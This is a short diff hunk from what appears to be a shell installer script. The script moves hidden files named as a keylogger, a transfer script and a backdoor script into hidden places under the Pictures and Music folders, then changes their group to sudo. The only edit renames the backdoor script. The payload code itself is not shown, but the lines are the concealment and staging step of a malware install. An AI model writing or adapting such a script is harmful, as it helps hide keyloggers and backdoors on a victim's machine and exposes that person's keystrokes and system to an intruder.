@@ -43,7 +43,7 @@ mv .keylogger ~/Pictures
 mv .keylogger.sh ~/Pictures
 mv .transfer.sh ~/Pictures
 mkdir ~/Music/.epic-songs
-mv .backdoor_script ~/Music/.epic-songs
+mv .backdoor_script.sh ~/Music/.epic-songs
 cd ~/Pictures
 chgrp sudo .keylogger
 chgrp sudo .keylogger.sh
